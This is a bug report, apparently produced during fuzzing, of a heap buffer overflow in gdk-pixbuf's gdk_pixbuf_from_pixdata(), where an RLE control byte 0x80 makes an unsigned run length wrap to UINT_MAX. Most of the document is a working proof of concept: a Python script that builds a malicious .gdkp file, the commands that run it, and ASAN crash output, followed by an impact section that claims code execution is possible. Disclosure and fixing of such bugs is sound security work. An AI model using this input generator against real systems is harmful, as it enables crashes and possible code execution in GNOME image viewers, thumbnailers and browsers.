## Bug0: Heap Buffer Overflow via RLE Control Byte 0x80 in gdk_pixbuf_from_pixdata

In `gdk_pixbuf_from_pixdata()` in `gdk-pixdata.c` (lines 463–483), when the RLE control byte equals `0x80`, the computed run-length underflows from 0 to `UINT_MAX` in a `do`-`while` loop because no guard prevents the unsigned integer wrap, causing a heap buffer overflow that writes approximately 4 billion times beyond the allocated image buffer.

### PoC

Craft a malicious image file using the Python script below and process it with the ASAN-instrumented gdk-pixbuf-pixdata binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
Heap Buffer Overflow via RLE Control Byte 0x80 in gdk_pixbuf_from_pixdata
File: gdk-pixbuf/gdk-pixbuf/gdk-pixdata.c, lines 463-483

When control byte == 0x80 (128):
  length = 128 - 128 = 0  (guint)
  check_overrun = image_buffer + 0 * bpp > image_limit  ->  FALSE (no guard)
  do { memcpy(...); image_buffer += 3; } while (--length);
  --length on guint 0 wraps to UINT_MAX (~4 billion) -> heap buffer overflow
"""

import struct
import os

# GdkPixdata constants
GDK_PIXBUF_MAGIC_NUMBER       = 0x47646b50  # 'GdkP'
GDK_PIXDATA_COLOR_TYPE_RGB    = 0x01
GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16  # 0x00010000
GDK_PIXDATA_ENCODING_RLE      = 0x02 << 24  # 0x02000000
GDK_PIXDATA_HEADER_LENGTH     = 24          # 4+4+4+4+4+4

# Build pixdata_type: RLE + 8-bit samples + RGB
pixdata_type = GDK_PIXDATA_ENCODING_RLE | GDK_PIXDATA_SAMPLE_WIDTH_8 | GDK_PIXDATA_COLOR_TYPE_RGB
# = 0x02010001

# Image dimensions - small so deserialization succeeds
width     = 4
height    = 4
rowstride = width * 3  # 12 bytes per row, RGB

# Malicious RLE pixel data:
#   0x80 = constant-run control byte, length = 128 - 128 = 0
#   Followed by 3 color bytes (the "constant" color for the run)
# The decoder enters do-while, executes once, then --length wraps 0 -> UINT_MAX
pixel_data = b'\x80\xff\x00\x00'

# Total file length (header + pixel data) stored in the length field
total_length = GDK_PIXDATA_HEADER_LENGTH + len(pixel_data)  # 24 + 4 = 28

# Pack the 24-byte header in big-endian order
header = struct.pack('>IIIIII',
    GDK_PIXBUF_MAGIC_NUMBER,  # magic        "GdkP"
    total_length,              # length       28
    pixdata_type,              # pixdata_type 0x02010001
    rowstride,                 # rowstride    12
    width,                     # width        4
    height,                    # height       4
)

poc_bytes = header + pixel_data

out_path = 'poc_input.gdkp'
with open(out_path, 'wb') as f:
    f.write(poc_bytes)

print(f"[+] Generated {out_path} ({len(poc_bytes)} bytes)")
print(f"    magic:        0x{GDK_PIXBUF_MAGIC_NUMBER:08x}  ('GdkP')")
print(f"    length:       {total_length}  (header 24 + pixel_data {len(pixel_data)})")
print(f"    pixdata_type: 0x{pixdata_type:08x}  (RLE | SAMPLE_WIDTH_8 | RGB)")
print(f"    rowstride:    {rowstride}")
print(f"    width:        {width}")
print(f"    height:       {height}")
print(f"    pixel_data:   {pixel_data.hex()}  (0x80 triggers guint underflow to UINT_MAX)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata poc_input.gdkp /tmp/out.c || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x504000000680 at pc 0x7f8ae65252c3 bp 0x7ffcf5292eb0 sp 0x7ffcf5292658
WRITE of size 3 at 0x504000000680 thread T0
  #0 0x7f8ae65252c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827
  #1 0x7f8ae642eede in gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0+0xacede)

### Impact

An attacker who supplies a crafted `.gdkp` file (or any inline pixdata stream) can trigger a heap buffer overflow in `gdk_pixbuf_from_pixdata()` that writes approximately 4 billion times past the allocated image buffer, immediately corrupting heap metadata and adjacent allocations. Any application that loads untrusted images via gdk-pixbuf is exposed, including GNOME image viewers, file managers with thumbnail generation, and web browsers using the GTK image pipeline. The overflow reliably causes a denial-of-service crash and, with heap layout control, can be leveraged to achieve arbitrary code execution.
